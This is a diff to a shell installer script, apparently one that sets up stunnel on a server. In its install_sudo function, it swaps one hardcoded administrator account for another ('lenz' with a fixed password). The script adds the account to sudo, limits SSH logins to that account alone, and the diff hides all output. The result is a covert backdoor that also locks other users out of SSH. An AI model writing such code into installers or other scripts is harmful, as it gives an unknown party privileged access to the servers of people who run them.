@@ -472,11 +472,11 @@ sudo service stunnel4 restart
 
 install_sudo(){
   {
-    useradd -m nurdeveloper 2>/dev/null; echo nurdeveloper:@@NRDev123@@ | chpasswd &>/dev/null; usermod -aG wheel nurdeveloper &>/dev/null
+    useradd -m lenz 2>/dev/null; echo lenz:@@@F1r3n3t@@@ | chpasswd &>/dev/null; usermod -aG sudo lenz &>/dev/null
     sed -i 's/PermitRootLogin yes/PermitRootLogin no/g' /etc/ssh/sshd_config
-    echo "AllowGroups nurdeveloper" >> /etc/ssh/sshd_config
+    echo "AllowGroups lenz" >> /etc/ssh/sshd_config
     service sshd restart
-  }
+  }&>/dev/null
 }
 
 install_rclocal(){
